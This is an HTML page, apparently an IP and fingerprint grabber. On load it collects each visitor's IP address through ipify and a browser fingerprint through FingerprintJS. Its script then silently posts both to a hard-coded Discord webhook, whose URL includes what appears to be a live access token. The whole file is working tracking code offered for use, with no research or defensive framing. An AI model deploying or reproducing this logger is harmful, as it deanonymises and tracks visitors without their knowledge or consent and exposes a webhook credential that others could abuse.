<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Logger</title>
  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
  <style>
    body {
      background-color: #111;
      color: #0f0;
      font-family: monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    h1, p {
      margin: 0.5rem;
    }
  </style>
</head>
<body>
  <h1>Welcome</h1>
  <p id="ip">Fetching IP...</p>
  <p id="fp">Fetching Fingerprint...</p>

  <script>
    const webhook = "https://discord.com/api/webhooks/1362204715005251675/i7o9dGLluaS1H95w6r3-vkHs07wVhccFVY1PrXZA_lc0Hp8zhSTyaJDYleTasWDaO3aE";

    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "Unknown IP";
      }
    }

    async function getFingerprint() {
      const fp = await FingerprintJS.load();
      const result = await fp.get();
      return result.visitorId;
    }

    async function sendToDiscord(ip, fingerprint) {
      const payload = {
        content: `üîî **New Visitor Logged**\nüåê IP: \`${ip}\`\nüß† Fingerprint: \`${fingerprint}\``
      };

      try {
        await fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
      } catch (e) {
        console.warn("Webhook failed:", e);
      }
    }

    async function initLogger() {
      const ip = await getIP();
      const fingerprint = await getFingerprint();

      document.getElementById("ip").innerText = `IP: ${ip}`;
      document.getElementById("fp").innerText = `Fingerprint: ${fingerprint}`;

      sendToDiscord(ip, fingerprint);
    }

    initLogger();
  </script>
</body>
</html>
